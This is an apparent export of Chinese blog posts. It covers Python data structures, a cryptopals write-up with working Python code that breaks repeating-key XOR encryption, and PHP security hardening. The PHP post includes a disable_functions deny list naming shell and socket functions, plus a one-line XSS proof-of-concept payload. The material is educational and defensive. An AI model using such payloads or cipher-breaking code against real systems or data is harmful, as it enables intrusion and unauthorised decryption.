(&#39;3&#39;, &#39;4&#39;, {&#39;weight&#39;: 4})] [(&#39;2&#39;, &#39;3&#39;), (&#39;0&#39;, &#39;1&#39;), (&#39;1&#39;, &#39;2&#39;), (&#39;3&#39;, &#39;4&#39;)] 最短路径1234567891011121314151617#生成graph G.clear() G = nx.Graph() G.add_weighted_edges_from([('0','1',2),('0','2',7),('1','2',3),('1','3',8),('1','4',5),('2','3',1),('3','4',4)]) #边和节点信息 edge_labels = nx.get_edge_attributes(G,'weight') labels=&#123;'0':'0','1':'1','2':'2','3':'3','4':'4'&#125; #dijkstra算法dpath=nx.dijkstra_path(G, source="1", target="3")#求最短路径dlen=nx.dijkstra_path_length(G,source="1", target="3")#求最短距离lis=list(path)for pt in lis: print(pt)print(dlen)print(dpath) 4 [&#39;1&#39;, &#39;2&#39;, &#39;3&#39;] 树 在树这一块又比较多的概念，包括叶子结点，分支节点，节点的度，树的度，孩子节点，双亲节点，祖先节点，子孙节点，节点的层，树的深度，有序树，无序树…… 树的分类有：树，二叉树（完全二叉树（都有左右节点），满二叉树（所有节点除了最后一层都满了），线索二叉树（存储结构中包括先驱和后继），哈夫曼树（带权的最优二叉树）），森林（只是树的一种组合形式，其实也是树） 树的遍历：先序遍历，中序遍历，后序遍历，层次遍历 二叉树类123456789class TreeNode: def __init__(self,left,right): self.left=left self.right=right#调用方式如下：t=Tree(Tree("a","b"),Tree("c","d"))t.right.left &#39;c&#39; 多路搜索树123456class TreeNode: def __init__(self,kids,next=None): self.kids=self.val=kids self.next=nextt=Tree(Tree("a",Tree("b",Tree("c",Tree("d")))))t.kids.next.next.next.val &#39;d&#39; 孩子双亲表示法1234567891011class TreeNode: def __init__(self): self.data='#' self.parent='-1'troot=TreeNode()troot.data='root't=TreeNode()t.data="kid1"t.parent=troott.parent.datat.parent.data &#39;root&#39; 树的孩子表示法（拉链法）12345678910# 这种方法需要每个为每个节点建立一个孩子链class TreeNode(): def __init__(self): self.data='#' self.FirstChild=Noneclass ChildNode(): def __init__(self): self.index=-1#存储列表中的下标 self.NextSibling=None 树的孩子兄弟表示法12345class TreeNode(): def __init__(self): self.data='#' self.pFirstChild=None self.pNextSibling=None Huffman Encoding1234567import huffmanimport collections t1=huffman.codebook([('A', 2), ('B', 4), ('C', 1), ('D', 1)])print (t1)t2=huffman.codebook(collections.Counter('man the stand banana man').items())print (t2) {&#39;A&#39;: &#39;10&#39;, &#39;B&#39;: &#39;0&#39;, &#39;C&#39;: &#39;110&#39;, &#39;D&#39;: &#39;111&#39;} {&#39;m&#39;: &#39;0111&#39;, &#39;a&#39;: &#39;10&#39;, &#39;n&#39;: &#39;00&#39;, &#39; &#39;: &#39;111&#39;, &#39;t&#39;: &#39;1101&#39;, &#39;h&#39;: &#39;0101&#39;, &#39;e&#39;: &#39;0100&#39;, &#39;s&#39;: &#39;0110&#39;, &#39;d&#39;: &#39;11001&#39;, &#39;b&#39;: &#39;11000&#39;} 第三方库实现class tree其实只要到github 上搜索python tree 关键字就可以找到很多前人实现好的树类，所以本着拿来主义，我们可以在需要的时候直接进行import。这里推荐一种二叉树的实现类——binarytree(https://github.com/joowani/binarytree)。里面实现了二叉树的创建，反回树的属性和四种不同的遍历算法等。下面主要对这个库进行一些简单的使用介绍。 123456789from binarytree import Noderoot=Node(1)root.left = Node(2)root.right = Node(3)root.left.right = Node(4)root.left.right.left=Node(5)root.left.right.right=Node(6)print(root) ______1 / \ 2__ 3 \ 4 / \ 5 6 1print(root.values) [1, 2, 3, None, 4, None, None, None, None, 5, 6] 1print(root.max_leaf_depth,root.height,root.max_node_value,root.size) 3 3 6 6 1print(root.inorder)#中序遍历 [Node(2), Node(5), Node(4), Node(6), Node(1), Node(3)] 1print(root.preorder)#先序遍历 [Node(1), Node(2), Node(4), Node(5), Node(6), Node(3)] 1print(root.postorder)#后序遍历 [Node(5), Node(6), Node(4), Node(2), Node(3), Node(1)] 1print(root.levelorder)#层级遍历 [Node(1), Node(2), Node(3), Node(4), Node(5), Node(6)] 1print(list(root))#对binarytree对象使用list方法默认采用层级遍历 [Node(1), Node(2), Node(3), Node(4), Node(5), Node(6)] 当然了，还有一些其他的库，如treelib（https://treelib.readthedocs.io/en/latest/pyapi.html） 参考文献[1]https://github.com/prakhar1989/Algorithms[2]https://github.com/qiwsir/algorithm/blob/master/binary_tree_python.md[3]https://github.com/OmkarPathak/pygorithm[4]https://www.cnblogs.com/wushaogui/p/9239735.html[5]https://github.com/keon/algorithms]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[流密码攻击理论实践]]></title>
    <url>%2F2018%2F10%2F08%2F%E6%B5%81%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB%E7%90%86%E8%AE%BA%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[最近的密码学作业中涉及了一些关于重用密码本的密文破解的问题，感觉还是比较有价值的，所以在国庆期间打算借旅游之余把这篇文章落成。 背景一次一密的流密码被理论证明是完全理想化的不可破解的完美安全的加密方式。但是在现实生活中我们没法做到真正的伪随机的密密钥流。对于这种情况，想到的措施就是设计出攻击者优势可忽略的伪随机生成器，然后利用极短的密钥来近似的生成一次一密的密钥流。当然这篇文章不是讨论这些理论的证明和伪随机数生成器如何应用到安全的流密码，而是想介绍一些比较古老流密码的攻击思路，虽说比较古老，但是其指导意义和思维的锻炼是一点不含糊。 不安全的流密码使用举例 其中的一道题是coursa 密码学课程上的课后编程题，另一道题目是crypto chanllege set1 的一道流密码密钥重用的题。 在之后我们将尝试用两种方法来对其进行统计学以及英语特性上的攻击。这些攻击相当的犀利，准确率极高，只要捕获的密文足够多就能够实现对密钥的无差别猜解。以下是题目： coursa这道题目的大概意思说，我们捕获了一连串的密文，已知这些密文的加密方式为i抑或，并且抑或的密码本被多次使用了，我们能否通过这些捕获的存在不合理抑或利用方式的加密密文来还原出明文。读者可以点进连接去自己看看原题。不过这篇文章打算以下一个题目作为例子进行讲解，二者的解体思路和方法大同小异，核心思路一致。 crypto chanllege set1 question6这道题目很上一道题目其实十分的相似，都是流密码重用的类型，但是根据题目的提示，我们可以了解到一种利用汉明距离来进行密钥长度的猜接手段——汉名距离，在解除密钥长度后，我们可以采取两个方法来获取明文信息，具体细节稍后进行阐述。读者可以先进入原题进行一些初步理解，这里就不对题目做过多的解释。 攻击细节整个的攻击流程其实可以分为两个步骤：密钥长度猜解，其次是解出明文。接下来就对这两个部分进行是的剖析。 首先猜测密钥长度密钥长度的猜解其实比较直观的是进行暴力破解，在密钥长度比较短的时候比较凑效，但是随着密钥长度的增加，我们会发现暴力的方式会让效率相当的低下。甚至是根本解不出。但是在这两周的编程作业中，涉及到的密钥长度还是比较短的，不超过40位。暴力猜解的方法在思维上并没有什么难度，然后根据一番搜索，得知有这么一种利用The Hamming distance（汉明距离）来猜解密钥长度的方法。以下将对其进行进一步的阐述： 首先解释一下什么是汉明距离？汉明距离其实是在二进制层面观测两个等长字符串的比特位差异。可以看以下几个例子：123hamming(&quot;1010&quot;, &quot;1111&quot;) == 2hamming(&quot;1111&quot;, &quot;0000&quot;) == 4hamming(&quot;1111&quot;, &quot;1111&quot;) == 0 可以看到，1010与1111有两个比特位存在差异，所以汉明距离为2。有一种快速的求解汉明距离的方法就是将等长字符串的方法，那就是异或。将两个二进制的字符异或后计算值为1的比特位个数，就是最后的汉明距离。具体的代码如下： 1234567891011def bxor(a, b): # xor two byte strings of different lengths if len(a) &gt; len(b): return bytes([x ^ y for x, y in zip(a[:len(b)], b)]) else: return bytes([x ^ y for x, y in zip(a, b[:len(a)])])def hamming_distance(b1, b2): differing_bits = 0 for byte in bxor(b1, b2): differing_bits += bin(byte).count(&quot;1&quot;) return differing_bits 知道了汉明距离和汉明距离代码实现后，我们应该思考，汉明距离和密钥长度的猜解有什么联系？通过阅读题干和相关拓展资料，我们知道，两个以ascii编码的英文字符的汉明距离是2-3之间，也就是说正常英文字母的平均汉明距离为2-3（每比特），任意字符（非纯字母）的两两汉明距离平均为4。另外我们也容易知道，正确分组的密文与密文的汉明距离等于明文与明文的汉明距离（可以通过按正确密钥长度分组的密文与密文异或等于明文与明文异或证明）。这样，我们可以知道，当我们使用了正确的密钥长度后，两两字母进行计算汉明距离，那么这个值应该是趋于最小。为了增加效率，我们不需要对每一对分组都计算汉明距离，只需取出前几对就可说明问题。当然为了排除偶然误差，结果不应该只取最小的那一个密钥长度，而是酌情多取几组。以下是crypto chanllege set1 question6这道题的密钥长度猜解代码示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import base64def bxor(a, b): # xor two byte strings of different lengths if len(a) &gt; len(b): return bytes([x ^ y for x, y in zip(a[:len(b)], b)]) else: return bytes([x ^ y for x, y in zip(a, b[:len(a)])])def hamming_distance(b1, b2): differing_bits = 0 for byte in bxor(b1, b2): differing_bits += bin(byte).count(&quot;1&quot;) return differing_bitstext = &apos;&apos;with open(&quot;6.txt&quot;,&quot;r&quot;) as f: for line in f: text += lineb = base64.b64decode(text)normalized_distances = []for KEYSIZE in range(2, 40): #我们取其中前6段计算平局汉明距离 b1 = b[: KEYSIZE] b2 = b[KEYSIZE: KEYSIZE * 2] b3 = b[KEYSIZE * 2: KEYSIZE * 3] b4 = b[KEYSIZE * 3: KEYSIZE * 4] b5 = b[KEYSIZE * 4: KEYSIZE * 5] b6 = b[KEYSIZE * 5: KEYSIZE * 6] normalized_distance = float( hamming_distance(b1, b2) + hamming_distance(b2, b3) + hamming_distance(b3, b4) + hamming_distance(b4, b5) + hamming_distance(b5, b6) ) / (KEYSIZE * 5) normalized_distances.append( (KEYSIZE, normalized_distance) )normalized_distances = sorted(normalized_distances,key=lambda x:x[1])print(normalized_distances)#以下是运行结果：[(5, 2.96), (2, 3.0), (3, 3.3333333333333335), (29, 3.413793103448276), (31, 3.5935483870967744), (16, 3.7), (18, 3.7111111111111112), (14, 3.742857142857143), (15, 3.7466666666666666), (13, 3.753846153846154), (6, 3.7666666666666666), (19, 3.768421052631579), (8, 3.8), (20, 3.82), (37, 3.827027027027027), (39, 3.8666666666666667), (11, 3.8727272727272726), (33, 3.8727272727272726), (26, 3.8923076923076922), (12, 3.9), (17, 3.9176470588235293), (30, 3.92), (34, 3.9352941176470586), (22, 3.9454545454545453), (28, 3.95), (32, 3.95), (7, 3.9714285714285715), (27, 3.977777777777778), (21, 3.9904761904761905), (35, 3.994285714285714), (38, 4.021052631578947), (25, 4.024), (24, 4.033333333333333), (9, 4.044444444444444), (23, 4.069565217391304), (10, 4.1), (36, 4.188888888888889), (4, 4.2)][Finished in 0.1s] 可以看到，正确的密钥长度29排得比较靠前。这样我们从前往后取作为密钥长度来进行后面的密钥的猜解就可以大大增加我们的效率，相对于暴力遍历来说。这点在后面可以进一步看到。 根据猜出的密钥长度进行密文的解密在密文的解密部分，根据笔者的总结，发现有两种行之有效的办法。 methon one（合理利用明文的空格）:这种方法其实是利用了一个抑或的规律和一个小技巧。使用到的抑或定律其实相当的简单：在使用异或加密的形式下，使用相同密钥加密的明文和秘文间存在这个规律，密文和密文异或等于明文和明文异或。可以通过简单的数学公式加以证明，这里就不展开叙述。另一个小技巧就是：空格和所有小写字母异或结果是相应的大写字母，空格和所有大写字母异或是相应的小写字母。为了证明这个小技巧，可以使用一个python脚本来遍历输出。 1234results = []value = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;for asc1 in value: print(asc1,&quot;^0x20----&gt;&quot;,chr(ord(asc1)^0x20)) 这样当两个密文按照字节异或后的结果处于字母表的ascii值之间，我们就可以有很大的概率认为异或的明文字符之一是空格，那么根据这个规律，我们可以依次遍历出密钥的每个字节，当捕获的密文组足够多，我们就可以有相当大的概率解出整个密钥，因为当密文组够多，我们有很大的概率得到每个密钥对应异或的字节位上的明文为空格，然后依次异或出密钥。 当然读者可能会问，ascii码那么多，两两异或的结果处于字母区间的可能情况不是有很多种吗？这样说是一点没错的，我曾经尝试写过一个常用英文符号两两异或的脚本，遍历输出非空格下，两者异或的结果是字母表区间的python脚本，如下：12345678910111213141516171819results = []verifycode = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;value = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\,\/\.\&quot;\&apos;\?\!\ \:&apos;for asc1 in value: for asc2 in value: result = ord(asc1) ^ ord(asc2) if chr(result) in verifycode and asc1 != &apos; &apos; and asc2 != &apos; &apos;: results.append((asc1, asc2))filtedresult = []setresult = set(results)for i in setresult: for j in setresult: if set(i) != set(j) and set(i) not in filtedresult: filtedresult.append(set(i))print(&quot;verify len:&quot;, len(filtedresult))print(&quot;result:&quot;, filtedresult) 运行这个脚本，会发现有349种可能的情况，那么是不是说明运用空格这个点来破解不合理？其实不然，要知道，这349中可能性里面，没有哪一个字符可以满足与任何一个字母异或都是字母区间，这就是说，空格及有无可挑剔的最大可能。这样一来，我们可以分别按照密钥将密文重新分组，将异或用一个密钥字节的密文合并成一组，这样一来我们就可以拥有密钥长度个组，每个组都是明文异或同一个密钥字节得来的密文。取其中一个分组，将里面的字符两两异或，记录每个字符与其他每一个字符异或出现结果是字母的次数，取最大次数（因为根据概率学，明文空格情况下，该次数应该是最大的，当然不排除极小概率的特俗情况）的字符我们将推断其明文为空格，然后异或出该分组的密钥字节。说来可能有点绕，做出相应的图示如下： 以下是具体的实现的步骤：12341. 使用取模运算把密文分成n个分组（其中n是密钥长度），如此以来，我们就有了n个独立的凯撒加密式的密文组（因为每个分组里面的值是使用同一个密钥字节明文异或）。这样就把问题简化成了破解n个独立的凯撒加密模式的单字节抑或密码方式。这一步可以直接使用爆破，但是效率不高。我们采取另一种姿势。2. 将2中的每个分组做如下的操作：每个分组做嵌套循环，内循环，外循环。设置外循环计数值possible_space=0，max_possible=0，设置内循环计数值maxpossible=0,依次取出每个分组中的每一个字节做与其他字节两两抑或进行内循环，如果结果是字母，我们就把内循环计数值maxpossible+1,在每个内循环结束后进行max_possible的更新（与内循环maxpossible做对比），并记录当前字节的位置到possible_space，然后外循环继续。直至遍历完所有的字节。取出max_possible对应的字节位置possible_space处的字节码，我们把它对应的明文假设成空格（根据之前的讨论）然后将该位置的字节和0x20（空格）异或;找出相应位置的密钥字节。3. 重复2中的步骤，依次根据每个分组找出每位的密钥字节，至此密钥破解完毕4. 将找出的密钥用于破解密文。当密文足够多，可以发现破解的准确率很高，基本可以做到无差别破解。 可能读者对上述步骤仍旧存在一些疑问，这里以例题作为进一步的说明（crypto chanllege set1 question6），下面是解题代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445def break_single_key_xor(text): key = 0 possible_space=0 max_possible=0 letters = string.ascii_letters.encode(&apos;ascii&apos;) for a in range(0, len(text)): maxpossible = 0 for b in range(0, len(text)): if(a == b): continue c = text[a] ^ text[b] if c not in letters and c != 0: continue maxpossible += 1 if maxpossible&gt;max_possible: max_possible=maxpossible possible_space=a key = text[possible_space]^ 0x20 return chr(key)text = &apos;&apos;with open(&quot;6.txt&quot;,&quot;r&quot;) as f: for line in f: text += line b = base64.b64decode(text)for KEYSIZE in range(2, 40): # KEYSIZE=29 block_bytes = [[] for _ in range(KEYSIZE)] for i, byte in enumerate(b): block_bytes[i % KEYSIZE].append(byte) keys = &apos;&apos; try: for bbytes in block_bytes: keys += break_single_key_xor(bbytes) key = bytearray(keys * len(b), &quot;utf-8&quot;) plaintext = bxor(b, key) print(&quot;keysize:&quot;, KEYSIZE) print(&quot;key is:&quot;, keys, &quot;\n&quot;) s = bytes.decode(plaintext) print(s) except Exception: continue 在之前的讲述上，理解这段代码并不难，读者试着输出所有可能的结果，我们可以看到有40种不同的结果，当密钥长度爆破到29的时候，明文清晰可见。但是这里是采用爆破的方式猜解密钥长度，不是很智能。当我们使用之前汉明距离猜解密钥长度的方法，可以更加快速的得出结果，以下是改进版： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586import base64import stringdef bxor(a, b): # xor two byte strings of different lengths if len(a) &gt; len(b): return bytes([x ^ y for x, y in zip(a[:len(b)], b)]) else: return bytes([x ^ y for x, y in zip(a, b[:len(a)])])def hamming_distance(b1, b2): differing_bits = 0 for byte in bxor(b1, b2): differing_bits += bin(byte).count(&quot;1&quot;) return differing_bitsdef break_single_key_xor(text): key = 0 possible_space=0 max_possible=0 letters = string.ascii_letters.encode(&apos;ascii&apos;) for a in range(0, len(text)): maxpossible = 0 for b in range(0, len(text)): if(a == b): continue c = text[a] ^ text[b] if c not in letters and c != 0: continue maxpossible += 1 if maxpossible&gt;max_possible: max_possible=maxpossible possible_space=a key = text[possible_space]^ 0x20 return chr(key)text = &apos;&apos;with open(&quot;6.txt&quot;,&quot;r&quot;) as f: for line in f: text += lineb = base64.b64decode(text)normalized_distances = []for KEYSIZE in range(2, 40): #我们取其中前6段计算平局汉明距离 b1 = b[: KEYSIZE] b2 = b[KEYSIZE: KEYSIZE * 2] b3 = b[KEYSIZE * 2: KEYSIZE * 3] b4 = b[KEYSIZE * 3: KEYSIZE * 4] b5 = b[KEYSIZE * 4: KEYSIZE * 5] b6 = b[KEYSIZE * 5: KEYSIZE * 6] normalized_distance = float( hamming_distance(b1, b2) + hamming_distance(b2, b3) + hamming_distance(b3, b4) + hamming_distance(b4, b5) + hamming_distance(b5, b6) ) / (KEYSIZE * 5) normalized_distances.append( (KEYSIZE, normalized_distance) )normalized_distances = sorted(normalized_distances,key=lambda x:x[1])for KEYSIZE,_ in normalized_distances[:5]: block_bytes = [[] for _ in range(KEYSIZE)] for i, byte in enumerate(b): block_bytes[i % KEYSIZE].append(byte) keys = &apos;&apos; try: for bbytes in block_bytes: keys += break_single_key_xor(bbytes) key = bytearray(keys * len(b), &quot;utf-8&quot;) plaintext = bxor(b, key) print(&quot;keysize:&quot;, KEYSIZE) print(&quot;key is:&quot;, keys, &quot;\n&quot;) s = bytes.decode(plaintext) print(s) except Exception: continue 改进后我们可以更加快速的破解出明文，而且最后的人工搜索阶段也会减少很多的对比，十分友好。 methon two:当然除了利用空格来猜测密钥这种方法以外，我们还有另外一种比较大众化的思路，那就是是利用了字母出现的平频率统计规律进行权重赋值。其实说白了就是字频攻击。在methon one中的第一部以后，我们就有了一组组类似凯撒加密的密文，只不过他们组不成完整的词或句子，如果我们单单暴力遍历256种密钥可能，那么结果我们也缺少一个衡量的指标，别说256中可能够你看的，而且没有一种是成词成句的。所以这样解出密钥很费力。我们需要一个评判的指标实现高可用和高效性。这时词频攻击的优势就体现出来了。我们可以给英文中的字母根据百分比附一个权重，然后依次计算256组解密后的“明文”总权重，当总权值最高时，我们有理由相信这时的密钥字节是正确的。因为当截获的密文足够多，我们可以得到分布十分贴近字频规律的明文，这样算出来的总权值就越大。关于字频的统计特性，我们可以在网上搜到很多权重赋值版本。以下是对the cryptopals crypto challenges question6的样例：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122import base64import stringdef bxor(a, b): # xor two byte strings of different lengths if len(a) &gt; len(b): return bytes([x ^ y for x, y in zip(a[:len(b)], b)]) else: return bytes([x ^ y for x, y in zip(a, b[:len(a)])])def hamming_distance(b1, b2): differing_bits = 0 for byte in bxor(b1, b2): differing_bits += bin(byte).count(&quot;1&quot;) return differing_bitsdef score(s): freq = &#123;&#125; freq[&apos; &apos;] = 700000000 freq[&apos;e&apos;] = 390395169 freq[&apos;t&apos;] = 282039486 freq[&apos;a&apos;] = 248362256 freq[&apos;o&apos;] = 235661502 freq[&apos;i&apos;] = 214822972 freq[&apos;n&apos;] = 214319386 freq[&apos;s&apos;] = 196844692 freq[&apos;h&apos;] = 193607737 freq[&apos;r&apos;] = 184990759 freq[&apos;d&apos;] = 134044565 freq[&apos;l&apos;] = 125951672 freq[&apos;u&apos;] = 88219598 freq[&apos;c&apos;] = 79962026 freq[&apos;m&apos;] = 79502870 freq[&apos;f&apos;] = 72967175 freq[&apos;w&apos;] = 69069021 freq[&apos;g&apos;] = 61549736 freq[&apos;y&apos;] = 59010696 freq[&apos;p&apos;] = 55746578 freq[&apos;b&apos;] = 47673928 freq[&apos;v&apos;] = 30476191 freq[&apos;k&apos;] = 22969448 freq[&apos;x&apos;] = 5574077 freq[&apos;j&apos;] = 4507165 freq[&apos;q&apos;] = 3649838 freq[&apos;z&apos;] = 2456495 score = 0 string=bytes.decode(s) for c in string.lower(): if c in freq: score += freq[c] return scoredef break_single_key_xor(b1): max_score = 0 english_plaintext = 0 key = 0 for i in range(0,256): b2 = [i] * len(b1) try: plaintext = bxor(b1, b2) pscore = score(plaintext) except Exception: continue if pscore &gt; max_score or not max_score: max_score = pscore english_plaintext = plaintext key = chr(i) return keytext = &apos;&apos;with open(r&quot;c:/Users/lyy18291855970/Desktop/密码学/密码题/the cryptopals crypto challenges/6.txt&quot;, &quot;r&quot;) as f: for line in f: text += lineb = base64.b64decode(text)normalized_distances = []for KEYSIZE in range(2, 40): # 我们取其中前6段计算平局汉明距离 b1 = b[: KEYSIZE] b2 = b[KEYSIZE: KEYSIZE * 2] b3 = b[KEYSIZE * 2: KEYSIZE * 3] b4 = b[KEYSIZE * 3: KEYSIZE * 4] b5 = b[KEYSIZE * 4: KEYSIZE * 5] b6 = b[KEYSIZE * 5: KEYSIZE * 6] b7 = b[KEYSIZE * 6: KEYSIZE * 7] normalized_distance = float( hamming_distance(b1, b2) + hamming_distance(b2, b3) + hamming_distance(b3, b4) + hamming_distance(b4, b5) + hamming_distance(b5, b6) ) / (KEYSIZE * 5) normalized_distances.append( (KEYSIZE, normalized_distance) )normalized_distances = sorted(normalized_distances, key=lambda x: x[1])for KEYSIZE, _ in normalized_distances[:5]: block_bytes = [[] for _ in range(KEYSIZE)] for i, byte in enumerate(b): block_bytes[i % KEYSIZE].append(byte) keys = &apos;&apos; for bbytes in block_bytes: keys += break_single_key_xor(bbytes) key = bytearray(keys * len(b), &quot;utf-8&quot;) plaintext = bxor(b, key) print(&quot;keysize:&quot;, KEYSIZE) print(&quot;key is:&quot;, keys, &quot;\n&quot;) s = bytes.decode(plaintext) print(s) 反思回顾通过这一番折腾，对流密码的重用的不安全性有了更加深入的理解，同时也是对ctf密码题这类异或题型的解题思路的一次总结升华。在文章的最后想把这篇文章里用到的几个不错的思路或者说想法做一个总结性摘录： 12341. 在异或加密中，明文和明文异或等于密文和密文异或，并且二者的汉明距离一样。2. 空格和所有小写字母异或结果是相应的大写字母，空格和所有大写字母异或是相应的小写字母。除了空格以外，仍旧有一些组合可以出现异或结果是大小写字母，但是空格出现时，结果在大小写字母间的概率最大。3. 两个以ascii编码的英文字符的汉明距离是2-3之间，也就是说正常英文字母的平均汉明距离为2-3（每比特），任意字符（非纯字母）的两两汉明距离平均为4。4. 在破解这类问题的三步走：猜解密钥长度；根据密钥长度分组，依次求解密钥每个字节得出密钥；最后根据密钥还原出明文。 参考文献https://crypto.stackexchange.com/questions/8115/repeating-key-xor-and-hamming-distancehttps://cypher.codes/writing/cryptopals-challenge-set-1]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>cryptography</tag>
        <tag>流密码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈php安全]]></title>
    <url>%2F2018%2F09%2F05%2F%E6%B5%85%E8%B0%88php%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[php天生支持web应用的开发，以其简单易学，开发效率高而备受喜爱。使其占据了大片的市场。但是php本身的安全问题却一直备受诟病，以及编写不规范的php程序，使得web应用漏洞百出，这篇文章从配置文件和代码编写等角度总结前人的经验以及自己的感悟体会，但是不会十分细致的讲解每个漏洞的具体原理，也不会过多的涉及php语法讲解（除了部分关键函数），所以最好能够有一定php基础和对OWASP top10有所了解，最后向前辈致敬。 请充分了解你的php基本信息12345678# 注意到以下的文件结构在新版本php或者不同的发行版中略有不同，就好比在ubuntu18.04中安装php7就和下面的文件结构有较大的差别，所以下面的文件仅仅作为一个apache的架构参考。Root：/var/www/html默认Web服务：Apache（可以使用Lighttpd或Nginx代替）默认PHP配置文件：/etc/php.ini默认PHP Extensions配置目录：/etc/php.d/PHP安全配置样例文件：/etc/php.d/security.ini（需要使用文本编辑器创建这个文件）php 版本： php -v查看当前PHP所编译 ： php -m 敏感配置 以下是一些常见的配置举例，更多请查看：http://php.net/manual/zh/ini.core.php#ini.variables-order 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# 不在请求头中泄露php信息expose_php=Off # 不回显php错误（包括运行错误时和启动时错误），但是进行错误记录play_errors=Off display_startup_errors=offlog_errors=Onerror_log=/var/log/httpd/php_scripts_error.log# 文件上传开启与否和最大上传文件限制file_uploads=Onupload_max_filesize=1M# 控制最大post数据post_max_size=1M #注意到要比upload_max_filesize大，否则后者失效# 关闭远程代码执行allow_url_fopen=Offallow_url_include=Off# 关闭全局注册变量，不过默认5.x版本的php是offregister_globals=off# 关于安全模式和粗暴的魔术引号过滤，注意到save_mode模式在php5.3以上版本，safe_mode被弃用，在php5.4以上版本，则将此特性完全去除了。safe_mode=Onsafe_mode_include_dir = D:/phpstudy/www/include/magic_quotes_gpc=Off #如果开启了这个，然后在php应用中使用addslashes()过滤输入会造成双重转义，使得过滤无济于事，遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。magic_quotes_runtime# 资源管理防止过分消耗服务器资源max_execution_time = 30max_input_time = 30memory_limit = 40M# 禁用危险函数disable_functions = phpinfo,eval,passthru,assert,exec,system,ini_set,ini_get,get_included_files,get_defined_functions,get_defined_constants,get_defined_vars,glob,``,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen# 限制php访问文件系统open_basedir=&apos;/var/www/html/&apos;;......;......# session保存路径session.save_path=&quot;/var/lib/php/session&quot;# 上传文件默认路径upload_tmp_dir=&quot;/var/lib/php/upload&quot; 关于危险函数1234567891011# 特殊符号``:反引号运算符在激活了安全模式或者关闭了 shell_exec() 时是无效的，同时与其它某些语言不同，反引号不能在双引号字符串中使用。。否则将会当作shell命令执行，执行效果等同于shell_exec()。# 文件操作http://php.net/manual/zh/ref.filesystem.php# 全局信息，配置等http://php.net/manual/zh/ref.info.php# 程序执行http://php.net/manual/zh/book.exec.php 不要过分相信php弱类型前人之叙述比较完备，在这就不赘余，仅仅做个汇总。同样还可以参看官网给出的类型表PHP 类型比较表123456789101112131415161718192021222324252627282930313233343536373839400==&apos;0&apos; //true0 == &apos;abcdefg&apos; //true1 == &apos;1abcdef&apos; //truenull==false //true123==&apos;123&apos; //true //哈希比较&quot;0e132456789&quot;==&quot;0e7124511451155&quot; //true&quot;0e123456abc&quot;==&quot;0e1dddada&quot; //false&quot;0e1abc&quot;==&quot;0&quot; //true&quot;0x1e240&quot;==&quot;123456&quot; //true&quot;0x1e240&quot;==123456 //truevar_dump(intval(&apos;2&apos;)) //2var_dump(intval(&apos;3abcd&apos;)) //3var_dump(intval(&apos;abcd&apos;)) //0//任意两个array,MD5相等var_dump(md5($array1)==var_dump($array2)); //true//case 自转换，以下代码输出i is less than 3 but not negative$i =&quot;2abc&quot;;switch ($i) &#123;case 0:case 1:case 2: echo &quot;i is less than 3 but not negative&quot;; break;case 3: echo &quot;i is 3&quot;;&#125;//in_array的缺陷，array_search$array=[0,1,2,&apos;3&apos;];var_dump(in_array(&apos;abc&apos;, $array)); //truevar_dump(in_array(&apos;1bc&apos;, $array)); //true//strcmp在php5.x个版本后有些特性不太同，所以遇到的时候具体讨论 全局注册变量如果已经弃用的 register_globals 指令被设置为 on 那么局部变量也将在脚本的全局作用域中可用。例如， $_POST[‘foo’] 也将以 $foo 的形式存在。这将会造成一些变量覆盖，条件判断绕过。以下是简化的全局变量认证绕过模型1234567if(authenticated_user())&#123; $authorized=true;&#125;if($authorized)&#123; do something......&#125; 对于以上的绕过，我们可以有以下的规避措施：(1) php.ini register_globals=off(2) 在每次判断前初始化变量，如下：123456789$authorized=false;if(authenticated_user())&#123; $authorized=true;&#125;if($authorized)&#123; do something......&#125; 一些常出现的“安全”函数strip_tags该函数尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果。它使用与函数 fgetss() 一样的机制去除标记。但是记住光光去除标签，但是不去除属性，那么在一些可以引入js的代码的属性标签里仍旧会造成xss。具体查看参照 htmlspecialchars这个函数多用来对xss的过滤上，但是注意到这个函数对\和&#39;是不敏感的，本身不会处理,要想转义&#39;需要加入ENT_QUOTES参数，否则仍有可能会出现xss。举例如下：12345&lt;?php$name = $_GET["name"];$name = htmlspecialchars($name);?&gt;&lt;input type='text' value='&lt;?php echo $name?&gt;;'&gt; poc=?name=&#39;onmouseover=&#39;alert(1)，则在鼠标悬停在输入框上的时候会触发xss，笔者测试的时候IE可以弹窗，而chrome的xss过滤器直接把这个xss语句识别出了，拒绝访问。但是可以看出在绕过浏览器xss filter的情况下仍旧会导致xss。 htmlentitiesescapeshellarg将用户输入进行单引号包含，使其成为真正的字符串，而不会造成执行任意命令的不可控情况。 escaoeshellcmd反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 is_uploaded_file该函数用来检查文件是否正真的由用户传的，避免对非用户传的文件进行操作，从而泄露本地信息。 intval将输入转换成整数，有时被用来抵抗sqli。 fgetss这个函数可以从文件操作符中取出一行并且过滤掉html标签 